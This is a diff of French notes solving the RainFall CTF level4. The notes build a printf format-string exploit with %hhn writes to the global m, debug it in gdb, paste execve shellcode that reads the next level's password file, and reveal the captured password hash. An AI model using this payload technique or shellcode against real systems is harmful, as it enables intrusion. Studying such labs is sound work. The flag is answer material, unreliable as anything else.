@@ -117,10 +117,180 @@ void main(void)
 }
 
 
-quel est la valeur de 0x1025544
-decimal: 16930116
+m doit etre egale a 0x1025544 == 16930116(decimal)
 
-pas la place dans les 530 octets maxs de local_20c
+pas la place dans les 520 octets maxs de local_20c
+
+et encore moins dans les 512 octets(0x200) de fgets
 
 comment atteindre m avec le printf ?
 le shellcode?!
+https://masterccc.github.io/tools/shellcode_gen/
+\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x70\x61\x73\x73\x68\x35\x2f\x2f\x2e\x68\x65\x76\x65\x6c\x68\x65\x72\x2f\x6c\x68\x65\x2f\x75\x73\x68\x2f\x68\x6f\x6d\x89\xe1\x50\x51\x53\x89\xe1\x31\xc0\x83\xc0\x0b\xcd\x80
+
+(gdb) B *0x08048455
+Breakpoint 1, 0x08048455 in p ()
+(gdb) i r
+eax            0x4      4
+ecx            0x0      0
+edx            0x0      0
+ebx            0xb7fd0ff4       -1208152076
+esp            0xbffff4f0       0xbffff4f0
+ebp            0xbffff508       0xbffff508
+esi            0x0      0
+edi            0x0      0
+eip            0x8048455        0x8048455 <p+17>
+eflags         0x200286 [ PF SF IF ID ]
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+gs             0x33     51
+(gdb) info frame
+Stack level 0, frame at 0xbffff510:
+ eip = 0x8048455 in p; saved eip 0x804848d
+ called by frame at 0xbffff730
+ Arglist at 0xbffff508, args:
+ Locals at 0xbffff508, Previous frame's sp is 0xbffff510
+ Saved registers:
+  ebp at 0xbffff508, eip at 0xbffff50c
+(gdb)
+
+Donc 0xbffff50c saved eip addr
+
+
+Pas besoin d'ecrire dans future eip car on peut ecrire dans m directement
+1 octet (%hhn)
+2 octets (%hn)
+
+(gdb) print &m
+$1 = (<data variable, no debug info> *) 0x8049810
+
+
+m doit etre egale a 0x1025544 == 16930116(decimal)
+
+44 55 02 01
+
+[0x08049810][0x08049811][0x08049812][0x08049813]
+[A*44]
+[%hhn]
+[B*55]
+[%hhn]
+[A*2]
+[%hhn]
+[A*1]
+[%hhn]
+
+
+0x44 = 68
+0x55 = 85
+0x02 = 2 || 256 + 2 = 258
+0x01 = 1 || 512 + 1 = 513
+
+4 adresse au debut surement 4 X 4 = 16 octets 
+puis 68 - 16 = 52(a)
+puis 85 - 68 = 17(a)
+puis 258 - 85 = 173(a)
+puis 513 - 258 = 255(a)
+
+
+level4@RainFall:~$ cat /tmp/payload - | ./level4
+ls
+Segmentation fault (core dumped)
+level4@RainFall:~$
+
+
+level4@RainFall:~$ gdb ./level4
+...
+(gdb) run < <(cat /tmp/payload -)
+Starting program: /home/user/level4/level4 < <(cat /tmp/payload -)
+
+Program received signal SIGSEGV, Segmentation fault.
+0xb7e730f3 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
+(gdb)
+
+
+(gdb) disassemble p
+Dump of assembler code for function p:
+   0x08048444 <+0>:     push   %ebp
+   0x08048445 <+1>:     mov    %esp,%ebp
+   0x08048447 <+3>:     sub    $0x18,%esp
+   0x0804844a <+6>:     mov    0x8(%ebp),%eax
+   0x0804844d <+9>:     mov    %eax,(%esp)
+   0x08048450 <+12>:    call   0x8048340 <printf@plt>
+   0x08048455 <+17>:    leave
+   0x08048456 <+18>:    ret
+End of assembler dump.
+(gdb) b *0x08048455
+Breakpoint 1 at 0x8048455
+(gdb) run < <(cat /tmp/payload -)
+Starting program: /home/user/level4/level4 < <(cat /tmp/payload -)
+Breakpoint 1, 0x08048455 in p ()
+(gdb) x/x 0x8049810
+0x8049810 <m>:  0x00000000
+(gdb) x/s 0x8049810
+0x8049810 <m>:   ""
+(gdb) x/d 0x8049810
+0x8049810 <m>:  0
+(gdb)
+
+
+level4@RainFall:~$ echo "AAAA%x%x%x%x%x%x%x%x%x%x%x%x" - | ./level4
+AAAAb7ff26b0bffff794b7fd0ff400bffff758804848dbffff550200b7fd1ac0b7ff37d041414141 -
+
+donc %12
+
+
+level4@RainFall:~$ cat /tmp/payload - | ./level4
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+level4@RainFall:~$ gdb ./level4
+...
+(gdb)  b *0x08048455
+Breakpoint 1 at 0x8048455
+(gdb) run < <(cat /tmp/payload -)
+Starting program: /home/user/level4/level4 < <(cat /tmp/payload -)
+
+Breakpoint 1, 0x08048455 in p ()
+(gdb) x/x 0x8049810
+0x8049810 <m>:  0x00025544
+(gdb)
+
+level4@RainFall:~$ cat /tmp/payload | wc -c
+541
+
+
+trop de char pour le fgets
+
+
+inverssement de 1 et 2 
+
+
+0x44 = 68
+0x55 = 85
+0x01 = 1 || 256 + 1 = 257
+0x02 = 2 || 256 + 2 = 258
+
+4 adresse au debut surement 4 X 4 = 16 octets 
+puis 68 - 16 = 52(a)
+puis 85 - 68 = 17(a)
+puis 257 - 85 = 172(a)
+puis 258 - 257 = 1(a)
+
+
+(gdb) run < <(cat /tmp/payload -)
+Starting program: /home/user/level4/level4 < <(cat /tmp/payload -)
+ls
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaals
+
+Breakpoint 1, 0x08048455 in p ()
+(gdb) x/x 0x8049810
+0x8049810 <m>:  0x56025544
+(gdb)
+
+level4@RainFall:~$ cat /tmp/payload - | ./level4
+ls
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaals
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+ls
+level4@RainFall:~$
